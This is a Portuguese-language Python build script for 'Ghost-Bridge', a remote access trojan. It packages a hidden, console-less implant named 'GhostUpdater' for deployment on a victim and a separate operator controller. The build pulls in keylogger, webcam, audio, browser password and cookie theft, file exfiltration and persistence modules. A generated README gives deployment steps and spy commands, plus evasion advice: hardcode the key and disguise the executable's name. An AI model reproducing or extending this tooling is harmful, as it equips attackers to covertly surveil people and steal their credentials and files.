"""
Ghost-Bridge - Build Script
Compila o agente em .exe standalone usando PyInstaller.
"""
import os
import sys
import shutil
import subprocess
from datetime import datetime


def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║           Ghost-Bridge Build System v2.0                      ║
╠══════════════════════════════════════════════════════════════╣
║  Opções de Build:                                             ║
║    1. Agente (Implant) - Para deploy na vítima               ║
║    2. Controlador - Para o operador                          ║
║    3. Ambos                                                   ║
╚══════════════════════════════════════════════════════════════╝
    """)


def check_pyinstaller():
    """Verifica se PyInstaller está instalado."""
    try:
        import PyInstaller
        print(f"[+] PyInstaller {PyInstaller.__version__} encontrado")
        return True
    except ImportError:
        print("[!] PyInstaller não encontrado")
        print("[*] Instalando...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])
        return True


def build_agent(one_file=True, console=False, icon=None, name="GhostUpdater"):
    """
    Compila o agente.
    
    Args:
        one_file: Se True, cria um único .exe
        console: Se True, mostra console (para debug)
        icon: Caminho para ícone .ico
        name: Nome do executável
    """
    print("\n[*] Compilando Agente...")
    
    # Opções do PyInstaller
    options = [
        "pyinstaller",
        "--clean",
        "--noconfirm",
        f"--name={name}",
    ]
    
    if one_file:
        options.append("--onefile")
    
    if not console:
        options.append("--noconsole")  # Sem janela de console
    
    if icon and os.path.exists(icon):
        options.append(f"--icon={icon}")
    
    # Inclui módulos
    options.extend([
        "--hidden-import=modules",
        "--hidden-import=modules.keylogger",
        "--hidden-import=modules.screenshot",
        "--hidden-import=modules.clipboard",
        "--hidden-import=modules.browser",
        "--hidden-import=modules.system_info",
        "--hidden-import=modules.file_exfil",
        "--hidden-import=modules.webcam",
        "--hidden-import=modules.audio",
        "--hidden-import=modules.persistence",
        "--hidden-import=pynput",
        "--hidden-import=pynput.keyboard",
        "--hidden-import=pynput.keyboard._win32",
        "--hidden-import=PIL",
        "--hidden-import=mss",
        "--hidden-import=cv2",
        "--hidden-import=psutil",
        "--hidden-import=win32clipboard",
        "--hidden-import=win32crypt",
        "--hidden-import=win32api",
        "--hidden-import=win32con",
        "--hidden-import=wmi",
    ])
    
    # Adiciona arquivos de dados
    options.extend([
        "--add-data=.env.example;.",
        "--add-data=secret.key;." if os.path.exists("secret.key") else "",
    ])
    
    # Remove opções vazias
    options = [o for o in options if o]
    
    # Arquivo principal
    options.append("agent.py")
    
    # Executa
    print(f"[*] Comando: {' '.join(options)}")
    result = subprocess.run(options, capture_output=True, text=True)
    
    if result.returncode == 0:
        exe_path = os.path.join("dist", f"{name}.exe")
        if os.path.exists(exe_path):
            size = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"[+] Build concluída: {exe_path}")
            print(f"[+] Tamanho: {size:.2f} MB")
            return exe_path
    else:
        print(f"[!] Erro na build:")
        print(result.stderr)
        return None


def build_controller(one_file=True, console=True, name="GhostController"):
    """Compila o controlador."""
    print("\n[*] Compilando Controlador...")
    
    options = [
        "pyinstaller",
        "--clean",
        "--noconfirm",
        f"--name={name}",
    ]
    
    if one_file:
        options.append("--onefile")
    
    # Controlador precisa de console
    if console:
        options.append("--console")
    
    options.extend([
        "--hidden-import=gspread",
        "--hidden-import=google.oauth2",
    ])
    
    options.append("controller.py")
    
    result = subprocess.run(options, capture_output=True, text=True)
    
    if result.returncode == 0:
        exe_path = os.path.join("dist", f"{name}.exe")
        if os.path.exists(exe_path):
            size = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"[+] Build concluída: {exe_path}")
            print(f"[+] Tamanho: {size:.2f} MB")
            return exe_path
    else:
        print(f"[!] Erro na build:")
        print(result.stderr)
        return None


def create_release_package(agent_path, controller_path):
    """Cria pacote de release."""
    print("\n[*] Criando pacote de release...")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    release_dir = f"release_{timestamp}"
    
    os.makedirs(release_dir, exist_ok=True)
    
    # Copia executáveis
    if agent_path and os.path.exists(agent_path):
        shutil.copy2(agent_path, release_dir)
    
    if controller_path and os.path.exists(controller_path):
        shutil.copy2(controller_path, release_dir)
    
    # Copia arquivos de configuração
    for file in [".env.example", "secret.key"]:
        if os.path.exists(file):
            shutil.copy2(file, release_dir)
    
    # Cria README para release
    readme = f"""# Ghost-Bridge Release {timestamp}

## Arquivos

- `GhostUpdater.exe` - Agente (deploy na vítima)
- `GhostController.exe` - Controlador (para o operador)
- `.env.example` - Template de configuração
- `secret.key` - Chave de criptografia (MANTER SEGURO!)

## Uso Rápido

### 1. Configurar APIs (Modo Real)
1. Copie `.env.example` para `.env`
2. Preencha as credenciais de Discord e Google

### 2. Deploy do Agente
- Copie `GhostUpdater.exe` e `secret.key` para a máquina alvo
- Execute (duplo clique ou linha de comando)

### 3. Controlar
- Execute `GhostController.exe`
- Digite comandos (ex: `whoami`, `!help`)

## Comandos Principais

```
!help              - Lista todos os comandos
!info              - Info do agente
!screenshot        - Captura tela
!webcam            - Captura webcam
!keylog start      - Inicia keylogger
!browser all       - Extrai senhas/cookies
!files exfil docs  - Exfiltra documentos
!persist install   - Instala persistência
```

## OPSEC

⚠️ IMPORTANTE:
- A chave `secret.key` deve ser a MESMA no agente e controlador
- Em produção, embede a chave no .exe (hardcoded)
- Mude o nome do executável para algo legítimo

"""
    
    with open(os.path.join(release_dir, "README.md"), "w") as f:
        f.write(readme)
    
    print(f"[+] Release criada em: {release_dir}/")
    return release_dir


def main():
    print_banner()
    
    # Verifica PyInstaller
    if not check_pyinstaller():
        return
    
    # Menu
    print("\n[?] O que deseja compilar?")
    print("    1. Apenas Agente (recomendado)")
    print("    2. Apenas Controlador")
    print("    3. Ambos + Pacote de Release")
    print("    0. Sair")
    
    try:
        choice = input("\n    Escolha [0-3]: ").strip()
    except:
        choice = "1"
    
    agent_path = None
    controller_path = None
    
    if choice == "1":
        agent_path = build_agent(name="GhostUpdater", console=False)
    
    elif choice == "2":
        controller_path = build_controller(name="GhostController", console=True)
    
    elif choice == "3":
        agent_path = build_agent(name="GhostUpdater", console=False)
        controller_path = build_controller(name="GhostController", console=True)
        
        if agent_path or controller_path:
            create_release_package(agent_path, controller_path)
    
    else:
        print("[*] Saindo...")
        return
    
    print("\n" + "="*60)
    print("  BUILD FINALIZADA")
    print("="*60)
    
    if agent_path:
        print(f"\n  Agente: {agent_path}")
    if controller_path:
        print(f"  Controlador: {controller_path}")
    
    print("\n  Dica: Para reduzir tamanho, use UPX:")
    print("        pip install pyinstaller[upx]")
    print()


if __name__ == "__main__":
    main()
